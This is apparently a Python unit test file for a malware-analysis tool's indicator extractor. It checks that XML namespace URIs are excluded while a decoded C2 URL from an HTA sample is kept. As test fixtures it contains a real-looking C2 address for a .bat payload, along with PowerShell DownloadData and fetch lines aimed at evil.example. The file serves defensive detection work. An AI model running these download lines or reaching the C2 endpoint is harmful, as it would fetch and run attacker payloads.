"""XML/XHTML namespace declarations are not verified indicators.

MINE-HTA-IOC-GROUNDING-CLOSURE-1, defect A. An HTA/XHTML document declares
`xmlns="http://www.w3.org/1999/xhtml"`; that URI names a vocabulary, not a
network endpoint, and publishing it under Verified indicators sends an analyst
at a W3C specification. The URI reader now recognises the namespace-declaration
syntax and drops the value -- by CONTEXT, never a domain list, so the same URI
written anywhere else is still a legitimate indicator.
"""
from __future__ import annotations

import hashlib
import pathlib
import sys
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from orbit.runtime.analysis_indicators import uris_in  # noqa: E402
from orbit.runtime.analysis_runtime import (  # noqa: E402
    AnalysisRuntime,
    AnalysisSource,
    AnalysisWorkspace,
)
from orbit.runtime.evidence import EvidenceStore  # noqa: E402

MINE = ROOT / "workdir" / "samples" / "mine.hta"
C2 = "https://wall5tghf6fdg.api.opensourcesaas.org/ZOdcfNuo/myxwr5cli.bat"
XHTML_NS = "http://www.w3.org/1999/xhtml"
# T7: the frozen deterministic identity for mine.hta's decoded stages.
STAGE0_SHA = "0c6b4253cbd1eb8b"   # VBScript->PowerShell command stage (prefix)
C2_STAGE_SHA = "e2214909b2e7c671"  # PowerShell decode carrying the C2 (prefix)


class NamespaceExclusionTests(unittest.TestCase):
    def test_default_xhtml_namespace_excluded(self) -> None:
        self.assertEqual(uris_in(f'<html xmlns="{XHTML_NS}">'), [])

    def test_prefixed_xml_namespace_excluded(self) -> None:
        text = "<x xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>"
        self.assertEqual(uris_in(text), [])

    def test_namespace_with_spacing_excluded(self) -> None:
        self.assertEqual(uris_in(f'xmlns = "{XHTML_NS}"'), [])

    def test_real_url_in_script_context_retained(self) -> None:
        got = uris_in('$wc.DownloadData("https://evil.example/a.bat")')
        self.assertEqual(got, ["https://evil.example/a.bat"])

    def test_decoded_c2_retained(self) -> None:
        self.assertEqual(uris_in(f'x = "{C2}"'), [C2])

    def test_namespace_looking_url_outside_syntax_retained(self) -> None:
        """The same URI, NOT in xmlns syntax, is a real indicator and kept:
        the filter is by context, never by matching the address itself."""
        self.assertEqual(
            uris_in(f"the loader beacons to {XHTML_NS} on start"), [XHTML_NS]
        )

    def test_mixed_namespace_and_real_endpoint(self) -> None:
        text = f'<html xmlns="{XHTML_NS}"><script>fetch("{C2}")</script>'
        self.assertEqual(uris_in(text), [C2])

    # An attribute that merely ENDS in `xmlns` is not a namespace declaration:
    # its value stays an indicator, so attacker markup cannot evade extraction
    # by embedding the URL in `data-xmlns` and similar.
    def test_data_xmlns_attribute_value_retained(self) -> None:
        url = "https://evil.example/a.bat"
        self.assertEqual(uris_in(f'<div data-xmlns="{url}">'), [url])

    def test_suffix_xmlns_attribute_value_retained(self) -> None:
        url = "https://evil.example/a.bat"
        self.assertEqual(uris_in(f'foo myxmlns="{url}"'), [url])
        self.assertEqual(uris_in(f'Xxmlns="{url}"'), [url])

    def test_unquoted_xmlns_token_then_url_retained(self) -> None:
        """A stray `xmlns=` token and a spaced, unquoted URL is not a real
        declaration; the URL is kept."""
        url = "https://evil.example/a.bat"
        self.assertEqual(uris_in(f"the config xmlns= {url}"), [url])


@unittest.skipUnless(MINE.exists(), "mine.hta sample required")
class RealSampleTests(unittest.TestCase):
    def _runtime(self) -> AnalysisRuntime:
        data = MINE.read_bytes()
        ws = AnalysisWorkspace.create()
        p = ws.source_root / "mine.hta"
        p.write_bytes(data)
        rt = AnalysisRuntime(
            backend=None,
            source=AnalysisSource(
                snapshot_path=p, sha256=hashlib.sha256(data).hexdigest(),
                size_bytes=len(data), original_path=str(p),
            ),
            evidence_store=EvidenceStore(root=ws.root / "evidence"),
            workspace=ws,
        )
        self.addCleanup(rt.close)
        rt._run_transform_preflight()
        return rt

    def test_verified_indicators_exclude_namespace_keep_c2(self) -> None:
        rt = self._runtime()
        vi = rt.verified_indicators()
        # T1: namespace absent from Verified indicators.
        self.assertNotIn("1999/xhtml", vi)
        # T2: the exact decoded C2 present.
        self.assertIn(C2, vi)
        # T3: the ONLY network indicator is the real C2 (no fabricated/metadata).
        from orbit.runtime.analysis_indicators import uris_in as _u
        self.assertEqual(_u(vi), [C2])

    def test_authoritative_set_excludes_namespace(self) -> None:
        rt = self._runtime()
        auth = rt.authoritative_indicators()
        self.assertFalse(any("xhtml" in a for a in auth))
        self.assertTrue(any("wall5tghf6fdg" in a for a in auth))

    def test_deterministic_stage_identity_unchanged(self) -> None:
        """T7: the decode is untouched by the indicator change."""
        rt = self._runtime()
        shas = [s.output_sha256[:16] for s, _ in rt.transform_stages]
        self.assertIn(STAGE0_SHA, shas)
        self.assertIn(C2_STAGE_SHA, shas)


if __name__ == "__main__":
    unittest.main()
